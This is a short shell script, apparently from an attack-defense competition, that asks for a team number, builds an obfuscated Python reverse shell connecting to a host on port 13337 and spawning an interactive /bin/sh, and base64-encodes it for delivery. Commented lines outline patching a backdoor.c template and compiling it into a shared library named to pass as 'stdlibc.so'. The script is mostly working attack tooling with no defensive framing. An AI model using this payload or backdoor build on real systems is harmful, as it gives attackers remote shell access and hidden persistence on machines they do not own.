echo 'Team num:'
read team

HOST1="10.$team.1.6"
HOST2="10.$team.1.69"

cmd1=$(echo "python -c 'a=__import__;b=a(\"socket\").socket;c=a(\"subprocess\").call;s=b();s.connect((\"$HOST1\",13337));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())'" | base64)
echo $cmd1

# sed 's/%%SYS_CALL1%%/' backdoor.c > backdoor1.c
# sed 's/%%SYS_CALL2%%/' backdoor1.c > backdoor_final.c
# gcc backdoor_final.c -o stdlibc.so -fPIC -shared -ldl

# rm backdoor1.c
